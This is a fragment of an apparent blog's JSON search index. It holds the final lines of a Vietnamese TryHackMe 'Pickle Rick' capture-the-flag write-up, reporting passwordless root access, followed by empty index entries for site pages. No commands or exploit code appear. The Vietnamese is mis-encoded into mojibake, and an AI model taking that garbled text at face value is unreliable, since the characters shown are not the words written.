quyá»n root mÃ  khÃ´ng cáº§n password.\nVáº­y lÃ  Ä‘Ã£ xong. Rooted.\n","date":"11 September 2021","externalUrl":null,"permalink":"/ctf/tryhackme/pickle-rick/","section":"Ctf","summary":"","title":"Tryhackme - Pickle Rick","type":"ctf"},{"content":"","externalUrl":null,"permalink":"/about/","section":"About me","summary":"","title":"About me","type":"about"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]